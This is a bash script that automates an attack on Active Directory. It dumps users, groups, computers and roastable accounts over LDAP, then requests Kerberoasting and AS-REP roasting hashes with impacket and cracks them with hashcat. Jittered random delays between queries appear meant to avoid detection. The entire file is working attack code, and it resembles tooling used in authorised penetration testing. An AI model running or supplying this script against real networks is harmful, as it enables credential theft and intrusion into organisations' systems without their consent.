#!/bin/bash

RED='\e[31m'
GREEN='\e[32m'
ENDCOLOR='\e[0m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BOLD='\033[1m'

while getopts ":d:i:u:p:" o; do
	case "${o}" in
		d) domain_address=${OPTARG} ;;
		i) ip=${OPTARG} ;;
		u) username=${OPTARG} ;;
		p) password=${OPTARG} ;;
		*) usage; exit 1 ;;
	esac
done
 
if [ -z "${domain_address}" ] || [ -z "${ip}" ] || [ -z "${username}" ] || [ -z "${password}" ]; then
	echo -e "${RED}Error: You entered missing/incomplete parameters!$ENDCOLOR"
	usage
	exit 1
fi

random_delay() {
    # Gaussian-like distribution için 3 random değer ortalaması
    local r1=$((RANDOM % 21 + 10))  # 10-30
    local r2=$((RANDOM % 21 + 10))
    local r3=$((RANDOM % 21 + 10))
    local delay=$(( (r1 + r2 + r3) / 3 ))
    
    # Küçük jitter ekle (-2 ila +2 saniye)
    local jitter=$((RANDOM % 5 - 2))
    delay=$((delay + jitter))
    
    # Sınırları koru
    [ $delay -lt 10 ] && delay=10
    [ $delay -gt 30 ] && delay=30
    
    echo -e "${CYAN}[*] Waiting ${delay}s...${ENDCOLOR}"
    sleep $delay
}


ldap_dump(){
	mkdir -p ./ldap_dump
	echo "===================================="
	echo -e "\nLDAP Enumeration"
	echo "Domain Address: $domain_address"
	echo "IP Address:     $ip"
	echo "Username:       $username"
	echo "===================================="

	dn_base=$(ldapsearch -x -H ldap://$ip -D "$username@$domain_address" -w "$password" -s base | grep "defaultNamingContext:" | cut -d " " -f 2)

	# users info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=user' dn sAMAccountName description memberOf servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/users.txt

	# groups info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=group' dn sAMAccountName description member memberOf servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/groups.txt

	# computers info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=computer' dn sAMAccountName operatingSystem operatingSystemVersion servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/computers.txt

	# Kerberoatable accounts
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(samAccountName=krbtgt)))" dn sAMAccountName servicePrincipalName \
	  -LLL -o ldif-wrap=no | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/kerberoastable.txt

	# AS-REP Roastable accounts
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" dn sAMAccountName description servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no | grep -v "#" \
	  | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/aspreproastable.txt

	echo -e "\nSaved Outputs:"
	[ -s "./ldap_dump/users.txt" ] && echo -e "📁 Users: ./ldap_dump/users.txt"
	[ -s "./ldap_dump/groups.txt" ] && echo -e "📁 Groups: ./ldap_dump/groups.txt"
	[ -s "./ldap_dump/computers.txt" ] && echo -e "📁 Computers: ./ldap_dump/computers.txt"
	[ -s "./ldap_dump/kerberoastable.txt" ] && echo -e "📁 Kerberoast: ./ldap_dump/kerberoastable.txt"
	[ -s "./ldap_dump/aspreproastable.txt" ] && echo -e "📁 AS-REP: ./ldap_dump/aspreproastable.txt"
	echo "===================================="
}

kerberos_attck(){
	[ -s "./ldap_dump/kerberoastable.txt" ] && cat ./ldap_dump/kerberoastable.txt | grep sAMA | awk '{print$2}' > ./ldap_dump/kerberoasting_usernames.txt
	[ -s "./ldap_dump/aspreproastable.txt" ] && cat ./ldap_dump/aspreproastable.txt | grep sAMA | awk '{print$2}' > ./ldap_dump/asprep_usernames.txt
	mkdir -p "./kerberos"
	#kerberoasting
	[ -s "./ldap_dump/kerberoasting_usernames.txt" ] && impacket-GetUserSPNs $domain_address/$username:"$password" -dc-ip $ip -request -outputfile ./kerberos/kerberoasting_hashes.txt &> /dev/null
	[ -s "./kerberos/kerberoasting_hashes.txt" ] && echo -e "\nKerberoasting success [$(cat ./kerberos/kerberoasting_hashes.txt | wc -l)] 📁: ./kerberos/kerberoasting_hashes.txt"
	#as-rep roasting
	random_delay
	[ -s "./ldap_dump/asprep_usernames.txt" ] && impacket-GetNPUsers $domain_address/ -usersfile ./ldap_dump/asprep_usernames.txt -dc-ip $ip -no-pass -outputfile ./kerberos/asreproasting_hashes.txt &> /dev/null
	[ -s "./kerberos/asreproasting_hashes.txt" ] && echo -e "AS-REP Roasting success [$(cat ./kerberos/asreproasting_hashes.txt | wc -l)] 📁: ./kerberos/asreproasting_hashes.txt\n"

	if [ ! -s "./kerberos/kerberoasting_hashes.txt" ] && [ ! -s "./kerberos/asreproasting_hashes.txt" ]; then
		echo -e "${RED}[-] No hashes found.${ENDCOLOR}"
		return 0
	fi

	echo -e "\n Do you want to crack hashes (y/n)"
		read -r answer
		[ "$answer" != "y" ] && { echo "[$esc] skipped."; return 0; }
		crack_hashes
}

crack_hashes(){
	echo -e "\nPassword List: "
	read -r wordlist

	if [ ! -s "$wordlist" ]; then
		echo -e "${RED}[!] Wordlist not found or empty: $wordlist${ENDCOLOR}"
		return 1
	fi
	mkdir -p ./hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$23\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs23.hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$17\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs17.hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$18\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs18.hashes

	[ -s ./kerberos/asreproasting_hashes.txt ] && grep -E '^\$krb5asrep\$23\$' ./kerberos/asreproasting_hashes.txt > ./hashes/asrep23.hashes

	find ./hashes/*.hashes -type f -empty -delete

	[ -s ./hashes/tgs23.hashes ] && hashcat -m 13100 -a 0 "./hashes/tgs23.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs23.hashes_cracked
	[ -s ./hashes/tgs17.hashes ] && hashcat -m 19600 -a 0 "./hashes/tgs17.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs17.hashes_cracked
	[ -s ./hashes/tgs18.hashes ] && hashcat -m 19700 -a 0 "./hashes/tgs18.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs18.hashes_cracked
	[ -s ./hashes/asrep23.hashes ] && hashcat -m 18200 -a 0 "./hashes/asrep23.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/asrep23.hashes_cracked

	[ -s ./hashes/tgs23.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs23.hashes_cracked"
	[ -s ./hashes/tgs17.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs17.hashes_cracked"
	[ -s ./hashes/tgs18.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs18.hashes_cracked"
	[ -s ./hashes/asrep23.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/asrep23.hashes_cracked"
}

main(){
	ldap_dump
	echo -e "\n Do you want to attack kerberos (y/n)"
		read -r answer
		[ "$answer" != "y" ] && { echo "[$esc] skipped."; return 0; }
		kerberos_attck

}

main
